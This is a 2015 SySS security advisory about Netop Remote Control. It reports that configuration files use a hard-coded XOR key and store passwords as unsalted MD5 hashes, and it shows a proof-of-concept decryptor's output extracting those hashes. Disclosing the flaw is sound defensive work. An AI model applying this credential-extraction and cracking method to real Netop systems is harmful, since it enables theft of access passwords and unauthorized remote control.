@@ -1,0 +1,152 @@
+id: 24140
+date: 08/25/2015
+title: NetOp Remote Control 11.52 / 12.11 Credential Issue Vulnerability
+author: Matthias Deeg
+cves: 
+
+Product: Netop Remote Control
+Vendor: Netop
+Affected Version(s): 11.52, 12.11
+Tested Version(s): 11.52, 12.11
+Vulnerability Type: Use of Hard-coded Cryptographic Key (CWE-321)
+                    Insufficiently Protected Credentials (CWE-522)
+Risk Level: Medium
+Solution Status: Not fixed
+Vendor Notification: 2015-06-19
+Solution Date: -
+Public Disclosure: 2015-08-24
+CVE Reference: Not yet assigned
+Author of Advisory: Matthias Deeg (SySS GmbH)
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Overview:
+
+Netop Remote Control is a widely-used remote support software with many 
+features.
+
+The vendor Netop describes the product as follows (see [1]):
+
+"Netop Remote Control is the most secure, trusted and scalable remote 
+support  software solution on the market today. We've been helping 
+customers grow their enterprises with secure remote control and support
+for workstations, servers, embedded systems and mobile devices for 30 
+years. Our flexible options provide secure remote access in even the
+most complex enterprise environments."
+
+Due to security issues in the credentials management, an attacker with 
+access to Netop Remote Configuration files can decrypt and extract 
+configured password information (raw MD5 hashes) and perform efficient 
+password guessing attacks in order to recover the corresponding 
+cleartext passwords, for example with the use of rainbow tables 
+(time-memory trade-off).
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vulnerability Details:
+
+Netop Remote Control stores configuration data in encrypted 
+configuration files with the file extension .ndb. The content of these 
+files is encrypted with a hard-coded cryptographic key (XOR key) that is 
+contained within the executable file NHSTW32.EXE. In the default 
+configuration, administrative privileges are required in order to read 
+these configuration files that are usually stored in an 
+application-specific folder within the Windows ProgramData folder, for 
+example in the following location:
+
+* %PROGRAMDATA%\Danware Data\C\Program Files (x86)\Netop\Netop Remote Control\Host
+
+Netop Remote Control password information, i.e. the configured 
+maintenance and access password, is stored in the configuration file 
+nhstconf.ndb as raw MD5 password hashes. Furthermore, Netop Remote 
+Control only supports upper-case passwords with a maximum length of 16 
+characters (actually all passwords are padded with spaces [0x20] to the 
+maximum password length of 16 characters), which reduces the search 
+space for password guessing attacks significantly.
+
+Thus, an attacker with access to Netop Remote Control configuration 
+files like nhstconf.ndb can easily decrypt its contents and perform 
+password guessing attacks against the extracted MD5 password hashes.
+
+Due to the use of the weak cryptographic hash algorithm MD5 without many 
+iterations and a salt, it is possible for an attacker to precompute 
+password candidates and thus to perform more efficient dictionary 
+attacks with the use  of rainbow tables (time-memory trade-off).
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Proof of Concept (PoC):
+
+The SySS GmbH developed a proof-of-concept software tool for decrypting 
+and extracting password information from the Netop Remote Control 
+configuration file nhstconf.ndb.
+
+The following output exemplarily shows a successful extraction of the 
+two MD5 password hashes for the maintenance and access password:
+
+$ ./netopcfgdecrypt.py nhstconf.ndb
+                _____________________________________________________________    
+               /    _____       _____ _____                                  \   
+              /    /  ___|     /  ___/  ___|                                  \  
+             |     \ `--. _   _\ `--.\ `--.                                    | 
+             |      `--. \ | | |`--. \`--. \                                   | 
+             |     /\__/ / |_| /\__/ /\__/ /                                   | 
+              \    \____/ \__, \____/\____/   ... decrypts your configs!      /  
+               \          __/ |                                              /   
+               /         |___/    __________________________________________/    
+              / _________________/                                               
+        (__) /_/                                                                 
+        (oo)                                                                     
+  /------\/                                                                      
+ / |____||                                                                       
+*  ||   ||                                                                       
+   ^^   ^^                                                                       
+Netop Config Decryptor v1.1 by Matthias Deeg <matthias.deeg@syss.de> - SySS GmbH (c) 2013-2015
+[*] Decrypt Netop config file
+[*] Decrypted config file saved to 'nhstconf.ndb.dec'
+[*] MD5 password hash #1 (maintenance password): a9473ded85aa51851deb4859cdd53f98
+[*] MD5 password hash #2 (access password)     : de7124255c6cb70591492236b5b6f04d
+
+In this example, the maintenance password (first MD5 hash) is the empty
+password, as the following output shows:
+
+$ echo -n "                " | md5sum
+a9473ded85aa51851deb4859cdd53f98  -
+
+The access password (second MD5 hash) is "S3CRET!", as the following 
+output illustrates:
+
+$ echo -n "S3CRET!         " | md5sum
+de7124255c6cb70591492236b5b6f04d  -
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Solution:
+
+The SySS GmbH is currently not aware of a solution for the reported
+security vulnerability.
+
+Please contact the vendor for further information.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Disclosure Timeline:
+
+2015-06-19: Vulnerability reported to vendor
+2015-06-26: Reported vulnerability again as the vendor did not reply to
+            to the first e-mail with the SySS security advisory
+2015-08-24: Public release of security advisory according to the SySS
+            Responsible Disclosure Policy 
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+References:
+
+[1] Netop Remote Control Web site
+    http://www.netop.com/remote-support.htm
+[2] SySS Security Advisory SYSS-2015-025
+    https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2015-025.txt
+[3] SySS Responsible Disclosure Policy
+    https://www.syss.de/en/news/responsible-disclosure-policy/
+
+#  0day.today [2023-03-26]  #
